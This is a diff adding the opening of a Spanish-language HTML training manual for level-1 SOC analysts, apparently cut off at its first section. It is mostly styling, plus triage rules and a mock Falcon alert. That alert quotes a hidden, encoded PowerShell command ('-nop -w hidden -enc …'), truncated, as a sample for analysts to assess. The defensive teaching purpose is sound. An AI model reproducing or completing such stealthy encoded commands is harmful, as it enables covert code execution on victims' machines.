@@ -1,0 +1,1160 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="Manual interactivo para analistas SOC nivel 1: cómo leer y resolver alertas en Falcon, Defender y Cortex.">
+<meta name="author" content="Alejandro Martínez">
+<title>Primera Línea SOC</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700;800;900&family=Archivo:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;600&display=swap">
+<style>
+/* Layout: consola de turno. Cabecera tipo tablero de alertas, navegación fija por secciones, tarjetas solo donde hay "objetos" (alertas, casos). */
+:root{
+  --bg:#0D0B0A; --surface:#161311; --raise:#1D1916; --sunk:#090807; --ink:#F3EDE6; --muted:#A3988D; --line:#2C2621;
+  --accent:#FF7A2F; --accent-ink:#FFA66E; --accent-wash:#2A1709; --grid:rgba(255,150,90,.07);
+  --crit:#F2554E; --high:#FFA94D; --med:#E6C65A; --low:#6BB6E0; --ok:#5CC48C;
+  --crit-wash:#2E1412; --ok-wash:#132A1D; --low-wash:#122633;
+  --f-display:"Big Shoulders Display","Barlow Condensed","Arial Narrow",sans-serif;
+  --f-body:"Archivo","Segoe UI",system-ui,sans-serif;
+  --f-mono:"IBM Plex Mono",ui-monospace,"Cascadia Mono",Consolas,monospace;
+  --r:6px; color-scheme:dark;
+}
+
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--ink);font-family:var(--f-body);font-size:17px;line-height:1.55;
+  padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px))}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:10;background:var(--bg)}
+.wrap{max-width:1260px;margin:0 auto}
+a{color:var(--accent-ink)} a:hover{color:var(--accent)}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+h1,h2,h3{font-family:var(--f-display);text-wrap:balance;line-height:1.05;margin:0}
+h2{font-size:clamp(2.3rem,6vw,3.4rem);font-weight:900;text-transform:uppercase;letter-spacing:.01em}
+h3{font-size:1.35rem;font-weight:700}
+p{margin:0}
+.mono{font-family:var(--f-mono);font-size:.86em}
+.eyebrow{font-family:var(--f-mono);font-size:.74rem;text-transform:uppercase;letter-spacing:.12em;color:var(--muted)}
+.lead{max-width:62ch;color:var(--muted);font-size:1.08rem}
+.prose{max-width:66ch}
+
+/* HERO */
+.hero{position:relative;isolation:isolate;display:grid;grid-template-columns:1.2fr 1fr;gap:40px;align-items:center;padding-block:44px 32px}
+.hero h1{font-size:clamp(3.8rem,14vw,8rem);font-weight:900;text-transform:uppercase;letter-spacing:-.01em;line-height:.88}
+.hero h1 span{color:var(--accent)}
+.hero .sub{font-size:1.25rem;margin-top:16px;max-width:30ch;font-weight:600}
+.hero .lead{margin-top:12px}
+.hero-meta{display:flex;flex-wrap:wrap;gap:8px;margin-top:20px}
+.tag{font-family:var(--f-mono);font-size:.72rem;letter-spacing:.06em;text-transform:uppercase;padding:4px 8px;border:1px solid var(--line);border-radius:3px;color:var(--muted);background:var(--surface)}
+.alert-mock{background:var(--surface);border:1px solid var(--line);border-left:5px solid var(--crit);border-radius:var(--r);padding:18px;font-size:.92rem;box-shadow:0 30px 90px -30px rgba(255,122,47,.45);min-width:0}
+.alert-mock .row{display:flex;justify-content:space-between;gap:12px;align-items:center;flex-wrap:wrap}
+.alert-mock .name{font-family:var(--f-display);font-size:1.5rem;font-weight:700;margin:10px 0 6px}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:4px 14px;font-size:.85rem;margin-top:10px}
+.kv dt{color:var(--muted);font-family:var(--f-mono);font-size:.78rem;padding-top:2px}
+.kv dd{margin:0;font-family:var(--f-mono);font-size:.8rem;overflow-wrap:anywhere}
+.cmd{background:var(--sunk);border-radius:4px;padding:8px 10px;font-family:var(--f-mono);font-size:.76rem;overflow-x:auto;white-space:pre;margin-top:10px}
+.alert-mock .q{margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
+
+.sev{font-family:var(--f-mono);font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:.08em;padding:3px 8px;border-radius:3px;color:var(--bg);white-space:nowrap}
+.sev.crit{background:var(--crit)} .sev.high{background:var(--high)} .sev.med{background:var(--med)} .sev.low{background:var(--low)}
+
+/* NAV */
+.nav{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:var(--bg);border-block:1px solid var(--line);margin-inline:calc(-1 * max(16px,env(safe-area-inset-left,0px)))}
+.nav-inner{max-width:1260px;margin:0 auto;display:flex;gap:4px;overflow-x:auto;padding:8px max(16px,env(safe-area-inset-left,0px));scrollbar-width:none}
+.nav-inner::-webkit-scrollbar{display:none}
+.nav a{font-family:var(--f-mono);font-size:.76rem;text-transform:uppercase;letter-spacing:.06em;text-decoration:none;color:var(--muted);padding:6px 8px;border-radius:3px;white-space:nowrap}
+.nav a:hover,.nav a.on{color:var(--ink);background:var(--surface)}
+.nav a.on{box-shadow:inset 0 -2px 0 var(--accent)}
+
+section{padding-block:56px 8px;scroll-margin-top:60px}
+.sec-head{display:grid;grid-template-columns:auto minmax(0,1fr);column-gap:28px;row-gap:10px;align-items:end;margin-bottom:34px}
+.sec-head > *{grid-column:2}
+.sec-head .sec-num{grid-column:1;grid-row:1 / span 3;align-self:start;font-family:var(--f-display);font-weight:900;font-size:clamp(4.2rem,11vw,8.5rem);line-height:.78;color:transparent;-webkit-text-stroke:1.5px var(--accent);letter-spacing:-.02em}
+.sec-head .eyebrow{color:var(--accent-ink)}
+
+/* RULES STRIP */
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:22px 26px;margin-top:16px}
+.rules div{border-top:2px solid var(--accent);padding-top:14px;font-size:.95rem;color:var(--muted)}
+.rules b{display:block;font-family:var(--f-display);font-weight:800;font-size:1.45rem;line-height:1.05;margin-bottom:6px;color:var(--ink);text-transform:uppercase}
+
+/* LAYERS */
+.layers{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.layer{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:20px;display:flex;flex-direction:column;gap:10px;min-width:0}
+.layer .big{font-family:var(--f-display);font-size:3rem;font-weight:800;line-height:1;color:var(--accent)}
+.layer .q{font-weight:700}
+.layer ul{margin:0;padding-left:18px;font-size:.95rem}
+.layer .ex{font-size:.85rem;color:var(--muted);border-top:1px solid var(--line);padding-top:10px;margin-top:auto}
+.analogy{margin-top:18px;padding:16px 18px;background:var(--accent-wash);border-radius:var(--r);max-width:none}
+.analogy b{color:var(--accent-ink)}
+
+/* CONSOLE TABS */
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px}
+.tab{font-family:var(--f-display);font-weight:700;font-size:1.15rem;padding:8px 16px;border:1px solid var(--line);background:var(--surface);color:var(--muted);border-radius:var(--r);cursor:pointer}
+.tab[aria-selected="true"]{background:var(--accent);color:var(--bg);border-color:var(--accent)}
+.console{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:22px;display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.console .blk{min-width:0}
+.console h4{font-family:var(--f-mono);font-size:.74rem;text-transform:uppercase;letter-spacing:.1em;color:var(--accent-ink);margin:0 0 8px}
+.console ul{margin:0;padding-left:18px}
+.console li{margin-bottom:4px}
+.console .tip{grid-column:1/-1;border-top:1px dashed var(--line);padding-top:16px;font-size:1rem}
+.console .tip b{font-family:var(--f-display);font-size:1.1rem}
+.chips{display:flex;flex-wrap:wrap;gap:6px}
+.chip{font-family:var(--f-mono);font-size:.74rem;background:var(--sunk);padding:3px 7px;border-radius:3px}
+
+/* CODE */
+.code{position:relative;background:var(--sunk);border-radius:var(--r);margin-top:10px;min-width:0}
+.code pre{margin:0;padding:14px;overflow-x:auto;font-family:var(--f-mono);font-size:.78rem;line-height:1.55}
+.code .lang{position:absolute;top:6px;right:8px;display:flex;gap:6px;align-items:center}
+.code .lang span{font-family:var(--f-mono);font-size:.66rem;color:var(--muted);text-transform:uppercase}
+.btn{font-family:var(--f-mono);font-size:.72rem;text-transform:uppercase;letter-spacing:.06em;border:1px solid var(--line);background:var(--surface);color:var(--ink);padding:5px 9px;border-radius:3px;cursor:pointer}
+.btn:hover{border-color:var(--accent)}
+.btn.primary{background:var(--accent);border-color:var(--accent);color:var(--bg)}
+
+/* ATTACK CARDS */
+.toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:16px}
+.filter{font-family:var(--f-mono);font-size:.76rem;padding:6px 12px;border:1px solid var(--line);border-radius:20px;background:var(--surface);color:var(--muted);cursor:pointer}
+.filter[aria-pressed="true"]{border-color:var(--accent);color:var(--ink);background:var(--accent-wash)}
+.search{flex:1 1 220px;min-width:0;font:inherit;font-size:.95rem;padding:8px 12px;border:1px solid var(--line);border-radius:var(--r);background:var(--surface);color:var(--ink)}
+.attacks{display:grid;gap:10px}
+.attack{background:var(--surface);border:1px solid var(--line);border-radius:var(--r)}
+.attack summary{list-style:none;cursor:pointer;padding:16px 18px;display:grid;grid-template-columns:1fr auto;gap:6px 14px;align-items:start}
+.attack summary::-webkit-details-marker{display:none}
+.attack summary h3{font-size:1.3rem}
+.attack .hook{grid-column:1;color:var(--muted);font-size:.98rem}
+.attack .meta{grid-row:1/3;grid-column:2;display:flex;flex-direction:column;align-items:flex-end;gap:6px}
+.attack .layers-t{display:flex;gap:4px}
+.attack .layers-t span{font-family:var(--f-mono);font-size:.66rem;padding:2px 6px;border-radius:3px;background:var(--sunk)}
+.attack .mitre{font-family:var(--f-mono);font-size:.7rem;color:var(--muted)}
+.attack[open] summary{border-bottom:1px solid var(--line)}
+.attack .body{padding:16px 18px 18px;display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.attack .body > div{min-width:0}
+.attack h4{font-family:var(--f-mono);font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;margin:0 0 6px;color:var(--muted)}
+.attack ul{margin:0;padding-left:18px;font-size:.95rem}
+.attack .fp h4{color:var(--ok)} .attack .tp h4{color:var(--crit)}
+.escala{grid-column:1/-1;background:var(--crit-wash);border-radius:4px;padding:10px 12px;font-size:.92rem}
+.escala b{color:var(--crit)}
+.empty{color:var(--muted);padding:16px}
+
+/* TRIAGE */
+.steps{display:grid;gap:0;border-left:2px solid var(--line);margin-left:14px}
+.step{position:relative;padding:0 0 26px 30px}
+.step .n{position:absolute;left:-16px;top:-2px;width:30px;height:30px;border-radius:50%;background:var(--bg);border:2px solid var(--line);display:grid;place-items:center;font-family:var(--f-display);font-weight:800;font-size:1.05rem}
+.step.done .n{background:var(--ok);border-color:var(--ok);color:var(--bg)}
+.step label{display:flex;gap:10px;align-items:baseline;cursor:pointer}
+.step input{accent-color:var(--ok);width:18px;height:18px;flex:none;transform:translateY(3px)}
+.step h3{font-size:1.4rem}
+.step .why{margin-top:6px;max-width:66ch}
+.step .bad{margin-top:6px;font-size:.92rem;color:var(--muted)}
+.step .bad b{color:var(--crit)}
+.clock{display:flex;gap:16px;align-items:center;background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:16px 18px;margin-top:6px}
+.clock .big{font-family:var(--f-display);font-weight:800;font-size:2.6rem;color:var(--accent);line-height:1}
+
+/* FP */
+.verdicts{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:24px}
+.verdict{padding:18px;border-radius:var(--r);border:1px solid var(--line);background:var(--surface);min-width:0}
+.verdict .lbl{font-family:var(--f-display);font-weight:800;font-size:1.6rem;text-transform:uppercase}
+.verdict.tp .lbl{color:var(--crit)} .verdict.tpb .lbl{color:var(--low)} .verdict.fp .lbl{color:var(--ok)}
+.verdict p{margin-top:6px;font-size:.95rem}
+.verdict .ej{margin-top:10px;font-size:.86rem;color:var(--muted)}
+.questions{counter-reset:q;display:grid;grid-template-columns:repeat(2,1fr);gap:12px 28px}
+.questions li{list-style:none;counter-increment:q;padding-left:42px;position:relative;min-width:0}
+.questions li::before{content:counter(q);position:absolute;left:0;top:-4px;font-family:var(--f-display);font-weight:800;font-size:2rem;color:var(--accent)}
+.questions b{display:block}
+.questions{padding:0;margin:0}
+.callout{margin-top:24px;border:1px solid var(--line);border-left:5px solid var(--accent);border-radius:var(--r);padding:16px 18px;background:var(--surface)}
+.fp-sources{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin-top:20px}
+.fp-sources div{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:12px 14px;font-size:.93rem}
+.fp-sources b{display:block;font-family:var(--f-display);font-size:1.1rem}
+
+/* TABLE */
+.tbl-wrap{overflow-x:auto;background:var(--surface);border:1px solid var(--line);border-radius:var(--r)}
+table{border-collapse:collapse;width:100%;min-width:640px;font-size:.92rem}
+th,td{text-align:left;padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--f-mono);font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);background:var(--sunk);position:sticky;top:0}
+td.id{font-family:var(--f-mono);font-weight:600;white-space:nowrap;color:var(--accent-ink)}
+td.src{font-family:var(--f-mono);font-size:.76rem;color:var(--muted);white-space:nowrap}
+tr:last-child td{border-bottom:0}
+.grp td{background:var(--accent-wash);font-family:var(--f-display);font-weight:700;font-size:1.05rem}
+
+/* CASES */
+.case{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);margin-bottom:22px;overflow:hidden}
+.case-top{padding:18px 20px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;align-items:flex-start;border-bottom:1px solid var(--line)}
+.case-top h3{font-size:1.7rem}
+.case-top .console-name{font-family:var(--f-mono);font-size:.74rem;text-transform:uppercase;letter-spacing:.08em;padding:4px 8px;border-radius:3px;background:var(--ink);color:var(--bg)}
+.case-grid{display:grid;grid-template-columns:1fr 1.15fr;gap:0}
+.case-grid > div{padding:18px 20px;min-width:0}
+.case-grid > div + div{border-left:1px solid var(--line)}
+.timeline{list-style:none;padding:0;margin:0;display:grid;gap:10px}
+.timeline li{display:grid;grid-template-columns:62px 1fr;gap:10px;font-size:.92rem}
+.timeline time{font-family:var(--f-mono);font-size:.76rem;color:var(--muted);padding-top:2px}
+.timeline code{font-family:var(--f-mono);font-size:.78rem;background:var(--sunk);padding:1px 4px;border-radius:3px;overflow-wrap:anywhere}
+.ask{padding:18px 20px;background:var(--sunk);border-top:1px solid var(--line)}
+.ask p.qq{font-family:var(--f-display);font-size:1.35rem;font-weight:700;margin-bottom:12px}
+.opts{display:flex;flex-wrap:wrap;gap:8px}
+.opt{font:inherit;font-weight:600;padding:10px 14px;border-radius:var(--r);border:1px solid var(--line);background:var(--surface);color:var(--ink);cursor:pointer;text-align:left}
+.opt:hover{border-color:var(--accent)}
+.opt.right{border-color:var(--ok);background:var(--ok-wash)}
+.opt.wrong{border-color:var(--crit);background:var(--crit-wash)}
+.feedback{margin-top:14px;font-size:1rem}
+.feedback .verdict-line{font-weight:700}
+.reveal{padding:18px 20px;border-top:1px solid var(--line);display:grid;gap:16px}
+.reveal h4{font-family:var(--f-mono);font-size:.74rem;text-transform:uppercase;letter-spacing:.1em;margin:0 0 6px;color:var(--accent-ink)}
+.reveal ul,.reveal ol{margin:0;padding-left:20px}
+.reveal .cols{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.reveal .cols > div{min-width:0}
+
+/* TOOLS */
+.tool-groups{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.tool-group{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:18px;min-width:0}
+.tool-group h3{margin-bottom:10px}
+.tool{display:grid;grid-template-columns:minmax(0,1fr);padding:8px 0;border-top:1px solid var(--line)}
+.tool:first-of-type{border-top:0}
+.tool a{font-weight:700;text-decoration:none}
+.tool a::after{content:" ↗";font-size:.8em}
+.tool span{font-size:.92rem;color:var(--muted)}
+.warn{background:var(--crit-wash);border-radius:var(--r);padding:14px 16px;margin-bottom:16px}
+.warn b{color:var(--crit)}
+
+/* GLOSSARY */
+.gloss{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px}
+.term{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:12px 14px}
+.term dt{font-family:var(--f-display);font-weight:700;font-size:1.2rem}
+.term dd{margin:4px 0 0;font-size:.93rem}
+
+/* LEARN */
+.learn{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.learn-col h3{font-size:1.2rem;padding-bottom:8px;border-bottom:2px solid var(--accent);margin-bottom:6px}
+.res{padding:10px 0;border-bottom:1px solid var(--line)}
+.res a{font-weight:700;text-decoration:none}
+.res p{font-size:.9rem;color:var(--muted)}
+.res .lvl{font-family:var(--f-mono);font-size:.66rem;text-transform:uppercase;letter-spacing:.08em;color:var(--accent-ink)}
+
+/* KIT */
+.kit{display:grid;grid-template-columns:1.1fr 1fr;gap:16px}
+.kit > div{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:20px;min-width:0}
+.kit textarea{width:100%;min-height:300px;font-family:var(--f-mono);font-size:.8rem;line-height:1.5;background:var(--sunk);color:var(--ink);border:1px solid var(--line);border-radius:4px;padding:12px;resize:vertical}
+.kit ul{margin:0;padding-left:18px}
+.kit li{margin-bottom:8px}
+.kit .row{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:10px;flex-wrap:wrap}
+.toast{font-family:var(--f-mono);font-size:.72rem;color:var(--ok)}
+
+.byline{display:inline-flex;align-items:center;gap:10px;margin-top:22px;text-decoration:none;color:var(--ink);font-size:.92rem;line-height:1.3}
+.byline:hover{color:var(--ink)} .byline:hover b{color:var(--accent-ink)}
+.avatar{width:40px;height:40px;border-radius:50%;background:var(--accent);color:var(--bg);display:grid;place-items:center;font-family:var(--f-display);font-weight:800;font-size:1.1rem;flex:none;letter-spacing:.02em}
+.avatar.big{width:76px;height:76px;font-size:2rem;box-shadow:0 0 0 4px var(--bg),0 0 0 6px var(--accent)}
+.author{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:36px;display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.9fr);gap:32px 56px}
+.author-id{display:flex;flex-direction:column;align-items:flex-start;gap:4px;min-width:0;padding-right:40px;border-right:1px solid var(--line)}
+.author-id .avatar.big{margin-bottom:18px}
+.author-name{font-size:clamp(2rem,4vw,2.8rem);margin-top:4px}
+.role{font-weight:600;margin-top:6px} .role.muted{color:var(--muted);font-weight:400;margin-top:0}
+.author-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:0;margin:auto 0 0;padding-top:28px;width:100%}
+.author-stats div{border-top:1px solid var(--line);padding-top:10px}
+.author-stats dt{font-family:var(--f-mono);font-size:.66rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted)}
+.author-stats dd{margin:2px 0 0;font-family:var(--f-display);font-weight:900;font-size:2rem;line-height:1;color:var(--accent)}
+.author-why{display:grid;gap:14px;max-width:70ch;align-content:start}
+.author-why h3{font-size:1.6rem;text-transform:uppercase;margin-bottom:4px}
+.author-why p{color:var(--muted)}
+.author-why p.first{font-size:1.22rem;line-height:1.5;color:var(--ink)}
+.quote{margin:20px 0 0;padding:44px 40px;border-radius:var(--r);background:var(--accent-wash);border:1px solid var(--line);display:grid;grid-template-columns:auto minmax(0,1fr);column-gap:28px;align-items:start}
+.quote-mark{font-family:var(--f-display);font-weight:900;font-size:clamp(7rem,14vw,12rem);line-height:.72;color:transparent;-webkit-text-stroke:2px var(--accent)}
+.quote blockquote{margin:0}
+.quote p{font-family:var(--f-display);font-weight:800;font-size:clamp(1.8rem,4.2vw,3.3rem);line-height:1.05;text-wrap:balance;text-transform:uppercase;letter-spacing:.005em}
+.quote figcaption{grid-column:2;margin-top:18px;font-family:var(--f-mono);font-size:.76rem;text-transform:uppercase;letter-spacing:.12em;color:var(--accent-ink)}
+@media (max-width:860px){.author{grid-template-columns:1fr;padding:22px}.author-id{padding-right:0;border-right:0;padding-bottom:24px;border-bottom:1px solid var(--line)}.quote{grid-template-columns:1fr;padding:26px 22px}.quote-mark{font-size:6rem}.quote figcaption{grid-column:1}}
+.btn-in{display:inline-flex;align-items:center;gap:8px;margin-top:12px;padding:7px 12px;border-radius:4px;background:#0A66C2;color:#fff;text-decoration:none;font-weight:600;font-size:.9rem}
+.btn-in:hover{color:#fff;background:#004182}
+.btn-in span{font-family:var(--f-display);font-weight:800;background:#fff;color:#0A66C2;border-radius:2px;padding:0 4px;line-height:1.2}
+.mission{font-family:var(--f-display);font-weight:700;font-size:1.3rem;line-height:1.2;color:var(--accent-ink)}
+.hero::before{content:"";position:absolute;inset:-60px 0 0 0;z-index:-1;pointer-events:none;
+  background-image:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);background-size:44px 44px;
+  -webkit-mask-image:radial-gradient(ellipse at 72% 45%,#000 0%,transparent 68%);mask-image:radial-gradient(ellipse at 72% 45%,#000 0%,transparent 68%)}
+.ticker{overflow:hidden;border-top:1px solid var(--line);margin-inline:calc(-1 * max(16px,env(safe-area-inset-left,0px)))}
+.ticker-track{display:flex;width:max-content;gap:34px;padding:10px 16px;font-family:var(--f-mono);font-size:.74rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);white-space:nowrap}
+.ticker-track span::before{content:"";display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:9px;background:var(--dot,var(--accent));vertical-align:1px}
+.ticker .c{--dot:var(--crit)} .ticker .h{--dot:var(--high)} .ticker .m{--dot:var(--med)}
+@media (prefers-reduced-motion:no-preference){.ticker-track{animation:tick 60s linear infinite}@keyframes tick{to{transform:translateX(-50%)}}}
+@media (prefers-reduced-motion:reduce){.ticker{overflow-x:auto}}
+@media (max-width:860px){.sec-head{grid-template-columns:1fr}.sec-head .sec-num{grid-column:1;grid-row:auto;font-size:4.2rem}.sec-head > *{grid-column:1}}
+.lab-picker{display:grid;gap:14px;padding:22px 24px;background:var(--surface);border:1px solid var(--line);border-radius:var(--r);margin-bottom:18px}
+.pick-row{display:grid;grid-template-columns:150px minmax(0,1fr);gap:12px;align-items:center}
+.pick-lbl{font-family:var(--f-mono);font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted)}
+.pick-opts{display:flex;flex-wrap:wrap;gap:8px}
+.pick{font:inherit;font-size:.92rem;font-weight:600;padding:8px 14px;border-radius:999px;border:1px solid var(--line);background:var(--raise);color:var(--muted);cursor:pointer}
+.pick:hover{color:var(--ink);border-color:var(--accent)}
+.pick[aria-pressed="true"]{background:var(--accent);border-color:var(--accent);color:var(--bg)}
+.pick-count{font-family:var(--f-mono);font-size:.76rem;color:var(--accent-ink);margin:0}
+.lab-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:12px}
+.lab{position:relative;display:flex;flex-direction:column;gap:8px;padding:20px;background:var(--surface);border:1px solid var(--line);border-radius:var(--r);min-width:0}
+.lab:first-child{border-color:var(--accent);background:linear-gradient(160deg,var(--accent-wash),var(--surface) 70%)}
+.lab .step-n{font-family:var(--f-display);font-weight:900;font-size:2.6rem;line-height:.85;color:transparent;-webkit-text-stroke:1.2px var(--accent)}
+.lab .plat{font-family:var(--f-mono);font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--accent-ink)}
+.lab h3{font-size:1.45rem}
+.lab p{font-size:.94rem;color:var(--muted)}
+.lab .lab-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:auto;padding-top:6px}
+.lab .lab-tags span{font-family:var(--f-mono);font-size:.66rem;text-transform:uppercase;letter-spacing:.06em;padding:3px 7px;border-radius:3px;background:var(--sunk);color:var(--muted)}
+.lab .lab-tags .lv{color:var(--accent-ink)}
+.lab a.go{align-self:flex-start;margin-top:6px;font-family:var(--f-mono);font-size:.76rem;text-transform:uppercase;letter-spacing:.06em;text-decoration:none;padding:7px 12px;border-radius:4px;border:1px solid var(--accent);color:var(--accent-ink)}
+.lab a.go:hover{background:var(--accent);color:var(--bg)}
+.lab-note{margin-top:16px;max-width:80ch;color:var(--muted);font-size:.95rem}
+.lab-note b{color:var(--ink)}
+.practice{grid-column:1/-1;display:flex;flex-wrap:wrap;gap:8px;align-items:center;padding-top:12px;border-top:1px dashed var(--line);font-size:.9rem}
+.practice > span{font-family:var(--f-mono);font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--accent-ink)}
+.practice a{text-decoration:none;padding:4px 10px;border:1px solid var(--line);border-radius:999px;color:var(--ink);font-weight:600}
+.practice a:hover{border-color:var(--accent);color:var(--accent-ink)}
+.practice a::after{content:" ↗";font-size:.8em;color:var(--muted)}
+@media (max-width:860px){.pick-row{grid-template-columns:1fr;gap:6px}.lab-picker{padding:18px}}
+footer{padding-block:48px 40px;color:var(--muted);font-size:.9rem;border-top:1px solid var(--line);margin-top:56px}
+
+@media (max-width:860px){
+  .hero{grid-template-columns:1fr;gap:26px;padding-block:28px 24px}
+  .layers,.verdicts,.learn{grid-template-columns:1fr}
+  .console,.attack .body,.reveal .cols,.tool-groups,.kit,.questions{grid-template-columns:1fr}
+  .case-grid{grid-template-columns:1fr}
+  .case-grid > div + div{border-left:0;border-top:1px solid var(--line)}
+  .attack summary{grid-template-columns:1fr}
+  .attack .meta{grid-row:auto;grid-column:1;flex-direction:row;align-items:center;flex-wrap:wrap}
+}
+@media (prefers-reduced-motion:no-preference){
+  .attack[open] .body,.reveal{animation:in .25s ease-out}
+  @keyframes in{from{transform:translateY(-4px);opacity:.4}to{transform:none;opacity:1}}
+}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+
+<header class="hero">
+  <div>
+    <p class="eyebrow">Manual de campo · Analista SOC N1 · v1.0</p>
+    <h1>Primera<br><span>Línea</span> SOC</h1>
+    <p class="sub">Cómo leer una alerta en Falcon, Defender y Cortex sin adivinar.</p>
+    <p class="lead">Aquí no vas a encontrar cada alerta que existe. Vas a encontrar cómo piensa alguien que ya cerró cientos: qué ve cada herramienta, qué preguntar y dónde buscar. Y cuándo levantar la mano.</p>
+    <div class="hero-meta">
+      <span class="tag">~45 min de lectura</span>
+      <span class="tag">3 casos para resolver</span>
+      <span class="tag">KQL · CQL · XQL</span>
+    </div>
+    <a class="byline" href="#autor"><span class="avatar" aria-hidden="true">AM</span><span>Creada por <b>Alejandro Martínez</b><br>Threat Hunting · T-Systems México</span></a>
+  </div>
+  <aside class="alert-mock" aria-label="Ejemplo de alerta">
+    <div class="row"><span class="eyebrow">Endpoint detection · Falcon</span><span class="sev high">High</span></div>
+    <p class="name">Suspicious PowerShell execution</p>
+    <dl class="kv">
+      <dt>Host</dt><dd>LAP-CONTAB-014</dd>
+      <dt>Usuario</dt><dd>mgarcia</dd>
+      <dt>Padre</dt><dd>WINWORD.EXE</dd>
+      <dt>Acción</dt><dd>Detected (sin bloqueo)</dd>
+      <dt>MITRE</dt><dd>T1059.001</dd>
+    </dl>
+    <div class="cmd">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...</div>
+    <div class="q"><span>¿Falso positivo o ataque?</span><a class="btn primary" href="#casos">Resuélvelo</a></div>
+  </aside>
+</header>
+
+<div class="ticker" aria-hidden="true"><div class="ticker-track"><span class="h">Suspicious PowerShell execution</span><span class="c">LSASS memory access</span><span class="h">Atypical travel</span><span class="m">PsExec remote service</span><span class="c">Shadow copy deletion</span><span class="h">Inbox forwarding rule</span><span class="m">Beaconing to rare domain</span><span class="h">Office spawned script host</span><span class="c">Security log cleared</span><span class="m">Password spray detected</span><span class="h">Suspicious PowerShell execution</span><span class="c">LSASS memory access</span><span class="h">Atypical travel</span><span class="m">PsExec remote service</span><span class="c">Shadow copy deletion</span><span class="h">Inbox forwarding rule</span><span class="m">Beaconing to rare domain</span><span class="h">Office spawned script host</span><span class="c">Security log cleared</span><span class="m">Password spray detected</span></div></div>
+
+<nav class="nav" aria-label="Secciones">
+  <div class="nav-inner" id="nav">
+    <a href="#capas">EDR · XDR · SIEM</a>
+    <a href="#consolas">Consolas</a>
+    <a href="#ataques">Qué detectan</a>
+    <a href="#triage">Triage</a>
+    <a href="#fp">Falsos positivos</a>
+    <a href="#eventos">Eventos</a>
+    <a href="#casos">Casos</a>
+    <a href="#labs">Labs</a>
+    <a href="#herramientas">Herramientas</a>
+    <a href="#glosario">Glosario</a>
+    <a href="#aprender">Aprender</a>
+    <a href="#kit">Kit de turno</a>
+    <a href="#autor">Autor</a>
+  </div>
+</nav>
+
+<section aria-label="Reglas de la casa" style="padding-top:32px">
+  <p class="eyebrow">Cinco cosas que aprendí a la mala</p>
+  <div class="rules">
+    <div><b>El título es una pista</b>"Suspicious PowerShell" dice qué disparó la regla, no qué pasó. El veredicto sale del árbol de procesos.</div>
+    <div><b>Bloqueado no es resuelto</b>Si el EDR mató el proceso, pregúntate qué intentaba hacer después y si lo logró por otro lado.</div>
+    <div><b>Un FP se demuestra</b>"Seguro es de TI" no es evidencia. Un ticket, una firma o un patrón repetido sí.</div>
+    <div><b>Escalar a tiempo</b>En severidad alta, escalar con dudas nunca es error. Tardarte 2 horas sí lo es.</div>
+    <div><b>Escribe para el otro turno</b>Tu nota de cierre la va a leer alguien que no te puede llamar a las 3 am.</div>
+  </div>
+</section>
+
+<!-- CAPAS -->
+<section id="capas">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">01</span>
+    <p class="eyebrow">Lo básico</p>
+    <h2>Tres herramientas, tres preguntas</h2>
